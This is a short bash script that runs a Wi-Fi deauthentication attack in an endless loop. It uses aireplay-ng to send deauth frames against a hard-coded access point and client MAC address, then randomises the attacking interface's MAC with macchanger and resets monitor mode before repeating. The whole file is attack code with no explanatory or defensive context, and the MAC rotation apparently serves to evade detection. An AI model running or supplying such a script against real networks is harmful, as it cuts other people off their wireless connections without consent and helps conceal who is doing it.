#!/bin/bash

while true
do
	iwconfig wlan0 channel 6
	aireplay-ng -0 5 -a C8:3A:35:2A:BF:48 -c 78:00:9E:85:EA:0E  wlan0
	ifconfig wlan0 down
	macchanger -r wlan0 | grep "New MAC"
	iwconfig wlan0 mode monitor
	ifconfig wlan0 up
	iwconfig wlan0 | grep Mode
	sleep 3
	echo Waiting!!!!!!!
done
